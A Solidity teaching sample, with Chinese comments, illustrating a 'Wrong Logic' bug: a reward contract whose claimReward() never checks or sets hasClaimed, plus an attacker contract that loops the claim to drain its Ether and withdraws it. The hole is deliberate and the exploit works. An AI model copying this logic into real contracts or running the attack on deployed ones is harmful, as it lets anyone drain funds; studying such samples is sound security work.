// SPDX-License-Identifier: UNLICENSED
// Solidity version >=0.8.0
pragma solidity >=0.8.0;

// 漏洞名稱：Wrong Logic
// 描述：此漏洞為開發者在合約邏輯上犯下系統性的錯誤，導致可以重複執行意外的操作。
// 在 claimReward() 函式中，缺少檢查使用者是否已領取的邏輯，使得同一地址可以重複領取獎勵，造成合約資金被耗盡。

contract WrongLogicVulnerable {
    // 漏洞重點：狀態變數 hasClaimed 實際上沒有在 claimReward() 函式中被檢查或更新。
    mapping(address => bool) public hasClaimed; // 本應用來記錄每個地址是否已領取，但未在函式中運用
    
    uint public reward = 1 ether;
    
    // 合約部署時必須附帶足夠的資金
    constructor() payable {}
    
    // 漏洞函式：未檢查是否已領取，可重複領取
    function claimReward() public {
        require(address(this).balance >= reward, "Insufficient balance");

        // 錯誤邏輯：應該先檢查 hasClaimed[msg.sender]，並在領取後更新它，但這裡完全缺少這個邏輯
        // 這導致任何人可以無限次呼叫 claimReward()，直到合約耗盡資金
        payable(msg.sender).transfer(reward);
    }
    
    // 正確接收 Ether 的 receive 函式
    receive() external payable {}
}

// 攻擊者合約：利用以上漏洞進行多次呼叫連續領取獎勵，直到合約中的資金被耗盡
contract AttackWrongLogic {
    // 修改參數型別為 address payable，以符合轉換要求
    WrongLogicVulnerable public vulnerable;

    // 建議將參數型別設為 payable address
    constructor(address payable _vulnerable) {
        // 注意：需要顯式轉換至 payable address
        vulnerable = WrongLogicVulnerable(_vulnerable);
    }

    // 攻擊函式：可重複呼叫 claimReward()，直到獲取獎勵耗盡
    function attack(uint iterations) public {
        for (uint i = 0; i < iterations; i++) {
            vulnerable.claimReward();
        }
    }

    // 提款函式：將收到的 Ether 提到攻擊者地址
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
